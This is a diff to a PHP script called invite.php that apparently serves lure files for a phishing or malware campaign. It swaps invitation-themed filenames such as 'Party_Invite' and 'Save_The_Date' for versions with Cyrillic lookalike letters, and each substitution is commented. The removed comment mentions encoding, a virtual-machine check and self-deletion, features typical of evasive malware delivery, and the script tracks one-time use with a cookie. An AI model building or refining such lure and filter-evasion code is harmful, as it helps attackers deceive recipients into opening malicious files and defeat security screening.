@@ -1,13 +1,23 @@
 <?php
-// invite.php - Encoded + VM check + Self-delete after success
+// invite.php - With Unicode lookalike filenames
 header('Content-Type: text/plain; charset=utf-8');
 header('Cache-Control: no-store, no-cache, must-revalidate');
 
 $baseNames = [
-    "Party_Invite", "Letter_from_Friend", "Important_Mail", "Formal_Invitation",
-    "Invitation_Final", "Special_Invitation_VIP", "Special_letter_VIP",
-    "Ceremony_Invite", "RSVP_Invitation_Draft", "Personal_Invite", "Elegant_Invitation_Card",
-    "Invitation_Exclusive", "Save_The_Date_Invitation", "Save_The_Date"
+    "Pаrty_Invite",                    // a → а
+    "Lettеr_from_Friеnd",              // e → е
+    "Impоrtant_Mail",                  // o → о
+    "Fоrmal_Invitatiоn",               // o → о
+    "Invitatiоn_Final",                // o → о
+    "Spеcial_Invitatiоn_VIP",          // e → е , o → о
+    "Spеcial_lettеr_VIP",              // e → е
+    "Cеrеmоny_Invite",                 // e → е , o → о
+    "RSVP_Invitatiоn_Draft",           // o → о
+    "Pеrsоnal_Invite",                 // e → е , o → о
+    "Elеgant_Invitatiоn_Card",         // e → е , o → о
+    "Invitatiоn_Exclusivе",            // o → о , e → е
+    "Savе_Thе_Datе_Invitatiоn",        // e → е , o → о
+    "Savе_Thе_Datе"                    // e → е
 ];
 
 $cookieName = "inv_used";
